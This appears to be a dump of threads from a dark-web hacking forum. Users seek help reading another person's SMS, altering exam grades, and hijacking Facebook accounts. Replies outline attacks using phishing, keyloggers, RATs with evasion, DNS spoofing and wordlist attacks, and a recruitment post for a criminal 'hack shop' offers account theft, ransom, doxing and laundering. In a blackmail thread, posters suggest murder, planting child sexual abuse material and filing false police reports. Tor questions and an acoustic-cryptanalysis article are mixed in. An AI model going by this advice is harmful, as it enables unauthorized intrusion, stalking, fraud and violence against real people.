That would depend on what your "new found knowledge" is. If there is none, you must acquire some first. Personally, I recommend reading tutorials and learning known exploits only as a starting point. You will need to know the internals in order to do anything more sophisticated than that, which requires unconventional thinking in terms of the language/system you're trying to hack.Tip: most common hacks exploit badly escaped strings. Might wanna try through whatever user input you apps accept. 
Kali Linux is what I use to get passwords.
well, new found knowledge = PHP, HTML, a bit of javascript, Python, some ruby, C++ and some ActionScript (some re-education is needed for AS3 though)obviously knowing the languages isn't enough, does that mean I would nned some understanding of software engineering or something along these lines ??do you know any tutorials that have your stamp of approval ?? (in the sense of, you've seen them and thought they were helpful)
The thing is that you need to set a target and then study it thoroughly, there's no "universal hack". It will usually require more knowledge than what it would take to create whatever you're trying to hack into. Then, use what's available in unexpected/unconventional ways to achieve the desired outcome. It's more of a non-deterministic paradigm where you figure out and try many methods until you find what works for you.Since there's no universal way to it, no tutorial is enough, though the WikiHow article on how to hack is pretty accurate. Usually, you'll need to look-up specifics for what you want to do, which are dispersed among many documents. Also, technology is rarely static, so even if you have enough knowledge to hack into pretty much any system right now, tomorrow, you may have to learn or re-learn to keep up.
Thanks Zyx, truly helpful
How do I hack something to be able to read someone's SMS messages? Not iMessages, since I know those are encrypted, only SMS. 
If it's a smart phone (alternatives):If you can...- ...apply some social-engineering, find a way to get them to install an app (an email should do).- ...hack their Wi-Fi network, find a way in through their Wi-Fi receiver.- ...insert a DNS server controlled by you at the end of their chain (closest to the phone, to spoof the URLs), find a way to push updates to existing apps/OS.- ...think of ways to use what's available to achieve a different albeit desired outcome, do that (there are many ways to hack something).(Note that most of these methods may build upon the previous one.)If it's a "dumb" phone, I believe your only choice is to hack their phone provider (also works for smartphones, usually near impossible to maintain access).Couldn't think of much more, I stick to computers.
Yes, it's a quite old Samsung slide touchscreen phone. Do you know of any ways to hack a phone provider? 
Same as always: get an IP and do whatever your would do with a normal computer. The good news is that what you're looking for must be online. The bad news is the level of privacy requirements, so you are likely to encounter more than just a firewall.
I know what passwords they use for everything, as the idiot uses the same password for every single account and stores confidential information such as credit card numbers in his email. So I'm hoping it shouldn't be too hard! Thanks. 
OK...Correct me if I'm wrong: I want to browse, let's say, Yahoo.com through Tor - First my IP is changed, my request is encrypted in three layers and then it passes first through my ISP -> connects to a node (decrypts 1st layer) -> 2nd node (decp 2nd layer) -> exit relay (decp 3rd layer and it's now in plain text) -> passes through clearweb to yahoo.com -> the information I requested is sent back to the same exit relay and the process of encryptions and the nodes repeat until it reaches my computer. Right?And what about hidden services? Do they need the exit relays like if it were in clearweb?I mean, do hidden services need to pass surface internet in plain text like any other URL? For instance: may someone be on an exit relay reading this same very words I'm posting here at IE?Aren't hidden services deep away from surface internet?I've been reading Tor's "literature" but these questions remained. Thank you in advance.
"Because hidden services do not use exit nodes, connection to a hidden service is encrypted end-to-end and not subject to eavesdropping. There are, however, security issues involving Tor hidden services. For example, services that are reachable through Tor hidden services and the public Internet, are susceptible to correlation attacks and thus not perfectly hidden. Other pitfalls include misconfigured services (e.g. identifying information included by default in web server error responses), uptime and downtime statistics, intersection attacks, and user error."https://en.wikipedia.org/wiki/Tor_(anonymity_network)
Nice. Thanks.
Ciphers can now be broken by listening to the computers that use themEAVESDROPPING, be it simply sticking an ear against a door or listening to and analysing the noises made by tapping different keys on a keyboard, is a stock-in-trade of spying. Listening to a computer itself, though, as it hums away doing its calculations, is a new idea. But it is one whose time has come, according to Adi Shamir, of the Weizmann Institute, in Israel, and his colleagues. And Dr Shamir should know. He donated the initial letter of his surname to the acronym ���RSA�۝, one of the most commonly used forms of encryption. Acoustic cryptanalysis, as the new method is known, threatens RSA�۪s security.Acoustic cryptanalysis works by listening to a computer�۪s sonic signature���the noise its capacitors and coils make as they vibrate in response to the amount of power being drawn by its processor. Dr Shamir and his collaborator Eran Tromer, of Tel Aviv University, showed in 2004 that processing different RSA keys (the huge numbers needed to unlock the hidden message) produces different sonic signatures. At the time, they were unable to extract from these signatures the individual binary digits (bits) of a key, but in collaboration with Daniel Genkin of the Technion-Israel Institute of Technology they have overcome this obstacle, by tricking machines into decrypting known pieces of text.Applying their method to GnuPG, a popular version of RSA, they thus extracted full 4,096-bit keys from a range of laptops in less than an hour. This would let anyone with malign intent read encrypted messages sent to those computers.Tricking the machines proved surprisingly easy. Encrypted incoming e-mails are often decrypted as they arrive, so all the three researchers had to do was send the laptops encrypted e-mails carefully crafted so the acoustic leakage produced by decrypting them was specifically related to the value of particular bits in the key. A series of such texts, each building on knowledge gleaned from the previous attack, gradually builds up the whole number.The victim of such an attack will probably not realise something is wrong until he looks at the decrypted text and realises it is gobbledygook. And, given the volume of e-mails many people receive, there is a good chance that, if the attacking e-mails are made to look like spam, or are backdated so that they drop to the bottom of the recipient�۪s in-box, the attack may go unnoticed altogether.All this is no good, of course, if the sender of the attacking e-mails cannot then listen to the computer�۪s hum. That can be done in several ways: with a good old-fashioned bugging microphone, for example; or with a parabolic mike some distance away; or by hijacking the target computer�۪s own microphone, perhaps on the pretext of a chat on Skype or a similar service.http://www.economist.com/news/science-and-technology/21594240-ciphers-can-now-be-broken-listening-computers-use-them-unsafe-andSee also:https://en.wikipedia.org/wiki/Tempest_%28codename%29
(missing text from first link)If the attacker can get close to the computer himself, though (perhaps by organising a business meeting with the subject of the attack), an even cleverer approach is possible. A suitably programmed smartphone, placed close enough to the target, can both send the e-mails and do the analysis���a method tested, in a laboratory at least, by the researchers themselves.GnuPG has now created a patch designed to protect against this particular type of attack, using a technique called ���blinding�۝, which muddies the acoustic signature. But that merely starts an arms race between the blinders and the spies. And, as if all this were not enough, Dr Shamir, Dr Tromer and Mr Genkin have now shown that if a spy can somehow touch the target computer when it is decrypting an e-mail then he (or, rather, the electronic box of tricks he is wearing) can extract the key by measuring changes in the electric potential of the computer�۪s chassis relative to the ground potential of the room.This will not be the first time a spy has gone to earth, for sure. But perhaps it is the first when he is able to keep spying as he does so.Well... Fuck... So now we have to invest in soundproof rooms and (en/de)crypt stuff only while being inside of it?.. :(On a more serious note, wouldn't it be possible to generate extra noise to confuse the eavesdropper, aside from GPG's patch? How do they know what comes from decrypting and what comes from the hundreds of processes you'll usually find on a running Linux system (didn't use Windows as an example cause it tends to choke at over 200)?

I just had my A-levels in the Uk and I flopped them, so i need someone to help me.If anyone out there can hack into the server of OCR they're the exam board, and change my grades please.It would be much appreciated AND I WILL PAY IF THE JOB CAN BE DONE (only in BTC) !!!!!!!!!!!!!!!!!I'll make payment through evolution just to make sure your not trying to scam me.PLEASE CONTACT ME IF YOU THINK JOB CAN BE DONE.E-mail: streetz2610@hush.com
Then you would tell them your name and you identity would be revealed. Not a smart idea. 
That would be a bad idea,school have security systems even if someone managed to hack your grades in internet,the directors have copies of your bad grades in papers,it would only get things worse,I think you should accept your consequences and study more,that,s all,no one is perfect we all make mistakes.
it's different in the uk, the papers are marked externally and the results come out in august. And I wouldn't need to give my name because on the exam papers, we just write our candidate numbers.Plus the school doesn't receive back the exam papers just the grade. Please if anyone knows someone who can help it would be much please inform me. Any help would be greatly appreciated
Streetz trust me,they have the grades copied in many papers for situations like this where a student is trying to hack their notes,besides you need to accept the consequences of what you do and just study a bit more,you can't just contract a hacker everytime you fail in life and you want make it appear as if you didn't fail,please trust me,I can see I was once like you,a desperate person who didn't want to fail never and wanted to be seen by everyone as the perfect person,but i've learned,trust me,just leave the notes like they are before you make the situation worse.
If you do not learn how to accept good consequences as well bad consequences then you will only fail in life,im telling you this for you good.
@anomalisticThat's why everyone gets a passing grade.To ehhh "tumble" the tracks.(Got more interesting jobs to do not interested.) 
Gunner, wait you're not interested in this job with the exam grade or the job I asked you to help me?
Which exam board?
I think the OP means this, BlueAdept http://sat.collegeboard.org/scores
@BlueAdept the exam board is OCR in the UK
@anonmalistic2That's why I am not interested in this one.
Someone has recently hacked my stuff and is basically blackmailing me. They managed to get my family's numbers and are now texting them also, how would they get cell numbers as those are hard to find on the internet? And any solutions on how to stop this before they kill me as they are threatening? And sorry for bringing such a small hacking matter on this forum. 
Most important question: did they trace you back to your deep web activity? If so, HIDE, immediately (off the grid). That would mean you're facing feds, and whatever they're asking for in their blackmailing attempts will not satisfy them. Also, what exactly are they demanding?In the case they are not feds, you could:- do the same to them.- turn them in to the feds.- (hoping for more suggestions)
@ZyxIn the case they are not feds, you coud:- Murder them- threaten to kill their family- put illegal things on their harddrive, then turn them in (CP for example)
If you haven't done anything wrong, go to the police... In case you have something to hide from the government that those "hackers" can proof, I doubt they will touch your family anyways... Try to trick them into revealing something personal about them somehow.
Feds do not say that they will kill your family, most of the time.
Kirne, NEVER trust any government.The governments these days have no one but their own best interest at heart.
I am good a social engineering,may I take a look at some of the messages?
Yes. What would you looking at the messages be able to tell, Gunnerzz? And I have all the exit nodes they used, but how would I use those to find location of them, as I know they are somewhere near me.
Since when are they blackmailing you?
Email them to me or put a link to some screen shots
For about a week and a half. I've been hacking them back to delete all of the stuff they had receieved of mine. But how do I make sure they completely stop and leave me alone without killing them?
I can make sure they do I need screen shots, and any evidence of there involvement with you.
How would you make sure they do? Not trying to be mean, I am just always a little paranoid and I feel as if it could give out my identity by seeing the messages and evidence of my involvement with them. 
friend who owes me one...If you want my advice send the FBI a tip...Most likely not the first time they have done this...Get some money and a pat on the back and move of with your life...
Did you did anything to these hackers before they started bothering you(The truth please).
@anomalistic2: I was hoping you would not give in, but it seems like you are. If you do decide to share that information, make sure to sanitize it first from an agent's perspective. In case you choose to transmit files, don't just edit them, but rather create new ones to prevent data recovery. I strongly recommend against this. You can solve it yourself, just ask for advice if/when needed (carefully).I'm assuming they did not trace you back here (you didn't answer), so turning them in to the feds may be an option. Just make sure they don't connect the dots either.In the case you were thinking of instilling fear in them to get them off your back, be careful, it may backfire. If you scare them too much, they may feel unsafe by just leaving you alone.
The only thing stopping me from turning it in is they extracted things that could send me to jail... @Fabrico, I have an idea who it is and that person has always been bitter about the connections I have had. @Zyx, thanks for the advice! But how do I scare them into leaving me alone but not doing anything worse?
@anomalistic2: Before scaring them, I'd suggest to try reasoning. Some psychology/social engineering books may help in figuring out a good approach. There is always a reason, try to dissuade them (make them see it's useless/etc) or find a different to satisfy what they are after (would need to know what they want).If you choose to scare them, you could try demonstrating that there will be dire consequences for them and those they care for, even if they kill you. Having their info and evidence of their acts ready to be published upon your absence, from somewhere they cannot disable would do the trick. Since you'd have true data, you could even add more to it, things they haven't done. Then you could proceed to making them feel you can reach them any(where/time). This would be a total terror approach, making them feel hopeless and defenseless (the opposing extreme to what I recommended before).Otherwise, a warning shot could be enough. Call the cops on them (anonymously, from a burner phone) for some false hacking crime they haven't done. If they don't figure out where that came from, they'll think they have more enemies. If they do, they'll see you're not afraid and are not willing to just lay down and die.
Anomalistic,if you have a idea of who can be who is blackmailing you,then you might know if you did something to him/her or know the reason that person is bothering you,if you get to think in that you could use the advice of Zyx and reason with him/her,but if things get too dangerous I don't recommend scaring that will only incite them to blackmail you more and with new types of ways,I recommend that if the situation comes to a extreme level just contract a hacker in the Hidden wiki.
@AnomalisticMe or Zyx could get rid of those files easy....I wouldn't even charge for this....(You would owe me a "favor"[Thanks to the guy who wrote the godfather for that idea...])Just keeps you from getting in the same boat...To me these guy's don't sound to experienced...I feel like pros would have left you alone a long time ago...I don't know Zyx what do you think????
I know they're inexperienced. What type of favor would you like in return? 
@gunnerzz: Unless there is absolutely no other way to achieve what they're demanding, anyone resorting to blackmail to achieve something is incapable. This goes back to the lust for power over others. They're trying to get someone to do what they cannot. (Again, still no clue about what they want.)
@anomalisitic2Depends on what I need....(Any risk to you is a greater risk to me....)@Zyx That is vary true...I wish I had enough information to build a profile.(I don't need that much I had one post to go off of:http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=1517)@anomalisitic2If you are in charge of servers in a bank or software firm there looking for something.For them to go on this long they are unsure of them self's...Have you received any phone calls?I am looking for recordings....If you are getting threatening calls start recording them and don't speak into the phone.Build a noise generator if you are suspecting them of listening in on your conversations..(I can help you with that if you need me to...)Go over everything with a bug detector...Wish I could be there to help and teach you personally...Anything with cords are good candidates for bugs.Check and double check and land lines.There are these things called beige box's,check you outside phone box for possible taps.Again wish I could help you with this personally.Sorry to leave you a long "to-do list".Your friend,Gunner Zodiac Russtle 
@anomalistic,like how much would you calculate their hacker abilities are?
thank you so much guys for all the help. I have an IP address but I was only able to get location down to neighborhood. Is there any way to get actual address from IP address? And whoever is doing this,  has a high school hacking level. 
anomalistic,I usually don't recomend hackers to people but farewell you need help,just go to the hidden wiki and contract a hacker or accept the help of Gunner or Zyx.
I am jumping up and down wanting to do something!!This is some dumb ass script kitty these people are fun as hell to fuck with!!!!BRO I am asking for nothing!!(Not even a "favor"....)PLEASE FOR THE LOVE OF GOD LET ME DO SOMETHING!!!!*EDIT*Screwing with a script kitty is payment on its own!I literately want nothing in return!!!!You don't understand how rare this is....(No offense)Someone on that low of a level building up steam and confidence...Thinking there invincible.I need only two things.1.Chat logs and any threats.2.That IP address
Gunner I see your more interested in having fun using your hacker abilities then actually helping anomalistic.
It is just that this is like a virgin with DD+ boobs.Vary rare...I just want to raise a little hell....(Okay alot)But still please....He will wake up one morning  with there life in ruins...I have done this before they will be scared of the internet by the time I am done with HIM.This has to be one person just all there is to it.Don't forget it is:Gunner ZODIAC Russtle(ZODIAC as in the cereal killerA nickname that was given to me.)
Gunner, thank you so much for the help! How could I return the favor? And couldn't you easily find out who I am and it wouldn't make me anonymous anymore? 
And all I have is IP, can you ruin his life through that? And why are you so willing to help? Not that I don't appreciate it of course! 
Farewell Gunner.
I love fucking with script kiddies I don't know how else to put it....This guy is rare hackers/crackers alike are in this stage vary briefly,he is a satanist he is getting off on control and fear....Now I am no better...Just feels dame good to knock people like him down a many pegs.Yes I could easily find out who you are,I mean its a risk you have to take.... Just bare in mind if I really cared who you were I would have found that out a long time ago.My word is my living and my life.Please let me ruin him,to be honest if he was a pro I would not be as interested in this.He is a higher up and ever evolving ankle biter....This is the best time to kick a kitty in the balls.
@fabricoWhat do you mean?
I mean im with you Gunner,your right.
ahh cool.Last time that went south vary fast....
I don't understand?
When they said fair well they were looking to kill me...
Umm okay,and what are you planning to do with this person?
I promise you fear and terror.This is still just some dumb kid.
@fabrico: I did not offer my help in that sense...@anomalistic2: ... For the same reason I recommend to reject such help from anyone. Refer to the risk gunnerzz referred to, it is one no one here can afford.
@ZyxWell he makes it sound like he is dead.I can't make him anymore dead...So why does it matter????If he would trust me....He would see he is not dead....Adding to that If he will lose everything than why does he have to lose in trusting me?
Is anyone able to hack into the CollegeBoard and acquire their SATs for June 2014?
are you willing to pay for?
If you are then there are hundreds of services (in the deep web atleast) who can do it for you.
Sorry for late response...are you able to refrence any of theses services?
I would like to keep it in mind for the future
Whats a CollegeBoard?
I bet that would run a real steep price. Most large school systems have fairly secure systems. But if you can find someone who will, let me know.
Which board are you under, first?
Are you trying to hack your college?
Fabrico, no he's not trying to hack the college, just CollegeBoard which holds the SAT scores. Randomguy194, you just practically gave out your age, because the only person who takes the SAT is someone in high school.
I'm actually the ghost of Stonewall Jackson...but does anyone have a reference for any services...I just want to keep it in mind
I just read that there is a sort of URL directory managed by ICANN. where can I find it?
It would be helpful if you could tell me something about the 7 keys to restart the internet (like is it hashed or something).
huh?
Well, The Internet is located on top of Big Ben. You could restart it there, but you need to speak to the Elders of the Internet first, they will have to give you a permission.
wat
wait, is the server that contains the basic protocols of the internet in the big ben(can't it be pre-installed in the browser or something) and why the big ben?
No. It's hidden in the 7th dimmension on top of the Big Ben. We only know by rumor. You must speak to the Protocol Sage and give him the required password before he teleports you the the server.
This thread ... it is empty of intelligent life. Only some somehow trolls manage to live there...

The irony is: OP knows what he's talking about :PSeven people in the world each one carries a key and once those keys are combined they can be used to reboot/turn off the internet (the DNS servers) in the case of a terrorist attack or something among those lines. More info can be aquired by googling it yourself.Here are some suggestions:Paul Klane7 keys to the internetAndy LintonClearnet links:http://en.wikipedia.org/wiki/Paul_Kane_%28entrepreneur%29http://time.com/27682/key-to-internet-pail-klane-british/About the URL directory, I think you're reffering to something ISP:s have in storage, this I don't know much about unfortunately.
TOR wouldn't be affected by this however, aslong as it actually isn't a NSA experiment.
Rebooting/turning off a few DNS servers won't affect (almost) anybody.And the irony is, OP can find this site and be able to say "restart the internet (like is it hashed or something)"
Well, the point of my post was that he didn't just utter random words.And as for the "Rebooting/turning off a few DNS servers won't affect (almost) anybody" part, that's not true; after more reasearch I found that this is where the reboot/turn off occurrs: http://en.wikipedia.org/wiki/Domain_Name_System_Security_ExtensionsWhich does in fact affect MOST people.
I sure as hell can't restart the internet but I can as hell shut it down.I call it "cyber-goo",it is AI that really shouldn't exist for the better...Link to theory:http://science.howstuffworks.com/gray-goo.htmhttps://en.wikipedia.org/wiki/Grey_goohttps://startpage.com/do/search?Murphy's law:Anything that can go wrong will go wrong.Never rely on technology....If the vial is broken the game of the internet will forever change.
@gunnerzz: Could you elaborate about your "cyber-goo"? The "grey goo" scenario refers to nanotechnology and is limited by requiring raw materials, thus imposing the need to destroy other substances. In the case of information, no raw material is required (aside from energy, which in any case, is a raw material for the representation of data, not it's composition), making the same scenario inapplicable. Also, there is plenty of malware already that overwrites other data (again, without requiring that for it's own survival). What makes "cyber-goo" different?
Sorry admin and all others annoyed by this lol but the PM feature is not working for me so I guess this will have to do.This message is for gunnerzz:Looking forward to working with you a lot in the future on:- Creating a hackshop of sorts and some blackhat activity- Accessing the Marianas web- Co - Authoring some papersPlease let me know of a way to contact you IRC or torchat or email is prefered.Great minds are common but different minds should stick alike as we are a rare breed.RegardsNobody_hereP.S: Will be AFK until Friday or Saturday, and will talk Friday if possible.**EDITEDThis entire post compressed nicely into a hash.

No I have tried that before...
Just use the message option in on top option list.
Doesn't work.
@Kazuya,is there anyone who can fix it,who is the owner of this website?
Mr-Tape, he doesn't come on much anymore.
If the site is just going to fail with out him why don't we "barrow" his password?
It's not going to fail.
Or Gunner I have a better idea,why don't we "azk" his password.
@fabrico screw you in the ass.-_-
Why do you hate so much Gunner it was just a idea,it would be more easier and with no problems in a future where Mr-tape came back.
Dude my guess's are A.He went off gridB.Got arrestedC.Got assassinatedD.All of the above
Good point actually.
The simple reality is I think he prepared for it to...So A&C are most likely.
I don't understand?
Let me look around a little don't go anywhere.
Um okay.
http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=1517He broke his trust pattern.What ever happened to him he planed.  
Since when doesn't Mr-Tape log in this forum?
Exactly...
"I'll just leave here this little script I use to prevent timing analysis identification. Set up several onions and just leave them open while you're browsing through Tor. It's best if it's more than one in case anyone analyzing your traffic figures out what it is (they shouldn't be able to see what address you connect to).<?php if(empty(session_id())) {session_start();} ?><!DOCTYPE html><html><head><title>Traffic generator</title><?phpif(!isset($_SESSION['traffic_settings'])) {$_SESSION['traffic_settings']=[	'Minimum_refresh_rate'=>3,	'Maximum_refresh_rate'=>300,	'Minimum_content'=>0,	'Maximum_content'=>100000];}if(count($_POST)>0) {foreach($_SESSION['traffic_settings'] as $k=>$v) {if(isset($_POST[$k]) && !empty($_POST[$k])) {$_SESSION['traffic_settings'][$k]=intval($_POST[$k]);}}}$set=$_SESSION['traffic_settings'];$refresh=rand($set['Minimum_refresh_rate'], $set['Maximum_refresh_rate']);?><meta http-equiv=""refresh"" content=""<?php echo $refresh; ?>""></head><body><?php echo ""Next refresh in $refresh seconds.\n\n""; ?><form method=""POST""><?phpforeach($set as $k=>$v) {echo ""<div>$k: <input name=\""$k\"" placeholder=\""$v\""></div>"";}?><button type=""submit"">Submit</button></form><div style=""display:none""><?php for($t=0, $f=rand($set['Minimum_content'], $set['Maximum_content']); $t<$f; $t++) {echo '0';} ?></div></body></html>"
People make millions a day from selling bot traffic....This couldn't even begin to compete between cost and risk....
I think you misunderstood the purpose of it. It's just to generate more Tor traffic for yourself. There's no point in paying for someone to waste your own bandwidth.
Tell that to a lot of bloggers,they do it for the ad support to get more legit traffic.YouTubers do the same thing.
You're not gonna get ad traffic, and it's not meant to be used with sites. It's for you to keep it open while you browse, to generate more traffic through your Tor circuit to provide garbage traffic. The idea is for them to not see your traffic timing matching with the post timing. It's for personal use and if anyone finds that address, you should change it as soon as you notice.
Okay now I follow.Vary good Idea
Hi there all. I have decided to go blackhat again after a few years of being clean. I am short of funds and hate being poor, I want to get some money to fund several projects ofmy projects including my search for the marianas web.I am looking for a partner in crime as I prefer working with poeple, I hate going solo. Also I have a large botnet, i am very skilled in SQL and XSS but I have been out of the money laundering business and paypal hacking business for several years so I am kind of out of date in that regard.Things we wil be doing:Ransoming websitesHacking websites and selling themPaypal account hackingBTC wallet hackingDoxing and identity ransomPaypal account hackingBruteforcingRansoming social media accountsHacking into online casino's (@gunnerzz thanks for the idea) On this regard I have done some snooping and I have a few ways to get in.Selling services to the highest bidder.My idea: We will basically set up a TOR hack shop where people can buy our services, but also we will be doing freelancer work for our own benifit. On the shop we will sell accounts and hacked funds, as well as keeping some for ourselves.We will split money 50/50What I bring to the table:- Huge experiance in website hacking and SQL injection- Massive botnet and phyiscal resources- Website design and hosting- Supreme doxing skills- Bruteforcing skills/softwares- Virusing skills- Knowledge of the market- Anonymous BTC accounts and methods to clean bitcoins easily and efectivelyThings you should be able to do:- Experiance with Paypal/Bank/BTC account hacking (no  noobs with free bruteforce programs) Real hacking with SQL and other exploiting experiance- Contacts in the industry- Experiance- Hacking Skill- Not being a fedI look forward to all of your applications, together we can earn some serious cash.Regards
Can you even crack lol?I don't mean to be rude, but you don't sound like a real hacker, you sound like a cracker.For one, hackers aren't crackers, you crack security, destroy/get into stuff, hackers are different.On top of that, if you can't even memory edit then you're not worth anyone's time here.Just giving you the hard facts, because if you're naive in this place and get your ass exposed, you're probably going to jail.
@KazuyaI realise your mistake, I just listed the skills that would be useful. I can program in most laungages. Obviosly I can memory edit, anybody can do that lol. Im not going to jail lol but they have tried. What is your definiton of a "real" hacker because I can get into websites, accounts and remote control peoples PC's as well as DOX nearly anyone regardless of VPN's.  I can program and I can do most things on a computer. 
The terminology, a cracker breaks into things, and is usually what you think of a gray/black hat "hacker" is.A hacker is someone who creates things, or destroys and rebuilds them, but usually isn't doing it for malicious purposes, read about "clever playfulness".
@nobody_here_01I have had hits issued out on me for doing that...BE VARY CAREFUL!!!
I have been thinking about this...I am interested...My email is everywhere on here...Email me sometime.
Nobody:please don't become a criminal there are other ways of getting out of poorness,please don't become a criminal,you can still be a good person and get out of poorness.
Its a joke....He is looking for someone to hack with....
@gunnerzz:I don't understand is it a joke or does he actually want to do hack crimes.
It's both,he wants a friend to do crime with, but he still is looking for a friend.
@gunnerzzI will contact you on monday on holiday currently.
Someone lost verification for being to forward about their browsing habits.You'll get it back if you try real hard, and remember to minimize exposure to yourself or others within the community.
Who lost there verification?
Hello,I'm wondering how safe can Orbot for Android be to access onion services. I mean, to access Tor I'm using a Tails live pen free from any kind of personal data. The idea is to protect me from malicious services.On Android we have loads of personal information, from social networks to google store, adress books, you name it.Does anyone of you use it or tried it? Isn't that too risky? What do you think?Regards
Well it is again based on user case.Using OrBot on a phone with personal data can be done if you do not use the transparent proxy. You'll then need to use the android tor browser to achieve specific tasks. This way no personal data will leak over Tor.The best way to go, is to use a brand new phone, root it and then activate trans proxy. Use this phone only for Tor related tasks.But keep in mind : A phone is a phone, a computer is a computer. You better have less access but do it properly.
Thanks for your opinion.Yeap, I guess it's always more safe to stick to a computer. The idea is to check this and other foruns when I'm not at home on my tablet, nothing more. I know it would be less safer to snoop around hidden wiki or others similar on an android device. 
There is no problem with what you want to achieve, just maek sure to use OrBot properly with your actual device or have a dedicated device.Remember that 99% of case where people lose anonymity is because that person in question screwed.
Well, I've got a non rooted android tablet. This means that I have to stick only to the orweb, right?I did install it but didn't use it yet, just to check settings. There are several setups about "brigdes" and even about "exit nodes".Do you know how to configure it properly? All I know is that I must set it not be an exit node... :)
I need to hack the life out of a persons server. This human pisses me off and I was wishing to clog up his home server if this is possible(well I know it's possible). All I have is his twitter accounts and other such things. I was thinking I could use RAT even though that's fairly novice.Any good ideas, if you want to help you can email me at Toofelbmub@mail2tor.com(If this post is just completely useless let me know lol) 
If you have no idea what you're doing, your best bet is probably trying to Social Engineer his hosting provider into giving you access. 
Hello I need a good program to encrypt files. I know that pretymuch payable programs have backdoors in it. Any sugestions ? 
GPG, much better than PGP and it's open source + has a good implementation.How to make a GPG keyMake sure to add your GPG public key to the forum!
Thanks mate I will make only when I will have a bit of time.
Does anyone know anything about The blackshades program everyone is going crazy about? And more important, does it work?*sorry for any bad spelling, I'm really tired.*Have a great day!
Mmm you don't want BlackShades.It is a RAT - Remote Administartion Tool. It's basically a "virus" that allows you to take control of other computers ie. your "slaves" or "bots".Best free RAT would be DarkComet imo, no others have much better features anyways, all that really matters is making it undetectable.
Hi All, I am just getting started with my new O.S. An OS for people who hate surveilance the NSA and governments. An OS for the paranoid and the realistic. I am currently still looking for contributers but first lets get into the technical specs:Features:-Remote Mobile Wipe (with encrypted password)- Full multi layer encryption- Tor as browser- Virus detection and counter data stealing methods (I kind of used some of blackphones ideas here)- Blocking PRISM related software/sites- Identity creator software (Creates profiles and online identities for fake name and adds pics and bio you select. You can use these on prism sites.- USB's need to be verified before use with admin Password- Automatically encrypts all files and folders- Prevents software/viruses detecting files and folders- Automatically password protects files uploaded to the internet and other devices.- (on bluetooth connected pc's only) Detects bluetotth devices in area and if they are suspected of being NSA/PRISM related user is warned and bluetooth hacking software is opened for user to shutdown the devices connectivity, if no action is taken within 1 minute it automatically is hacked. ( I was thinking of doing something similer with WIFI?)- Automatic VPN/proxie use. Proxies will rotate.- Free anonymous email installed- (Still in production) Anonymous video chat pre installed- Anonymous Torrent programs- Wipe PC hotkey and 1 verification for password then erases with 35 passes.- Anti bruteforce with 5 tries for password and then auto wipe- Anti remote administration- Second password that if entered will erase everything (Anti fed)- Warns if NSA related hardware is installedI am still looking at other features to add such as integrating it as a mobile OS as well, please suggest.People I would like to work with: -Skilled programmers- Skilled hackers - Blackhat's  with lots of dity funds to fund promotion etc..- People who agree with open source- People who are inovative- People who ARE NOT FUCKING FEDERAL FUCKING AGENTS!- Cryptographers and encryption experts- Activists- Other interesting peopleIf you want to work with me drop a comment or PM me. This is still just an Idea and I am busy assembling a team. We will discuss weather to make it FREE or PAID. I personally like the idea of it being free. For working on this project if it is going to cost you can get a share, BUT I HAVE NO FUNDS FOR SALARIES. THIS IS WORK FOR PEOPLE WHO WANT TO DO SOMETHING GOOD!Let me know your ideas :P.
How about adding quick Lockdown ? I mean button on the screen that completly lock you phone and you can do nothing with it unless you connect it to your PC (not any PC only the last you connect your phone) and type password. If someone will try to use another PC phone deletes everything what is on it.I hope this is Intresting idea.I wish you luck with the project :]Sorry for all my gramma/language mistakes in this text (still learning english).
@SPY very interesting idea, the reverse is even more interesting, quick lockdown on your PC and you can only unlock it with the phone you are paired with. But it would also mean that if you lost your phone you are done for. But I will certaintly look at it in more detail, thinking of adding a USB format physical key needed to unlock your PC. That could be used instead of a password. All data could be stored on the key. If person A has the operating system and person B plugs in his key USB it will load person B's files etc...You just lead me on to a great train of thaught. Thank you so much!Dtop me an email if you want to work on this, projectfirstcontact@hmamail.com
You can put a key on a USB and your computer will only unlock if it detects that key on the USB, as well as a passphrase of some sort.You can do this easily already with dm-crypt+LUKS on Linux.It's a tiny bit less secure, but if you're worried about your USB getting lost or breaking, you can have the same key on multiple other USBs if that suits you, redundancy isn't a bad thing, but it slightly increases the chances of an attacker getting into your system.
@Kazuya Yes I was thinking much the same line. However maybe each person should get a unique key and I can plug my key into your OS and access my files, so almost a portable OS?
That's possible too.
How are you going to make that? I tried creating my own OS, but I didn't even get to the kernel loading part, as reading the filesystem was just too complicated for me. If we create it ourselves, it might take years before it works at all, don't even think of having it bug free, and don't even think of thinking of having drivers for things like USB sticks. But on the other hand, if we base it on linux, we can be quite sure that there's already an exploit just waiting to be used... I'm willing to help, but it'll take very long to build and will still be subject to hardware backdoors...
@the3coderI agree it is complex project but there are many sources available and the biggest issue will be encryption
As I said we need custom sources, or there will already be a backdoor preinstalled. Also we (fnord & I ATM) would like to talk over that in IRC, that'd go faster then posting sth. here everytime. http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=1432
@the3coderGoing to sleep now will go to IRC tomorrow. Look forward to working with you :D
Do yourself a favor and base it on linux! Please. You can't even imagine the trouble involving creating a OS from scratch. Even basing it on linux is hard enough, trust me.
Tails OS............I am on it right now.
 
Anyone here know how to access someone elses facebook account? A software or someway to get their e-mail and password. I know about phishing, but is there another way? 
You could try infecting the user's computer with a plain keylogger
So many ways to do this but you need to social engineer them, even if it's just tricking them to download a keylogger or typing their details into a phisher, they'll always have to be socially engineered. A good way to tricking them is making a fake facebook account under the targets friends name, then you can message them and tell them something like "Dude I just found a blahblah for blahhblah want it?".
or just import the contacts from face book to yahoo, then it's just a simple process of guessing their password. It only works if you are a friend of their's on facebook and you must know them personally.
It is possible to try passwords via bruteforce. I managed to write a script, which gives you ~10 combinations per second (you can go way higher in certain circumstances, but this is the fastest I had). It is quite slow, but actually usable - if you need only access to their profile (so to be in their friend list), you can simply download their friend list and try most common passwords on them. It's quite common to find password 1234567 at least once in 200 people.
Bruteforce will get you your IP address blocked very quick, probably tor is already locked (I didn't test it). Bruteforce over the net has never been a good idea. Good luck :)
It is possible - you get banned only when using http(s). And to clarify, I meant wordlist attack rather than bruteforce for obvious reasons, although it would make sense if you were able to "look over" your target's shoulder while typing password and notice certain facts (lower/uppercase, numbers and special symbols usage or number of keys used, which would undoubtedly speed up the process)
I stumbled on an idea, if you were to design a program, that runs the whole program(all the possible outcomes) and designed code that when executed would do the same thing as the original code. So could we find the source code of a proprietary program like that?
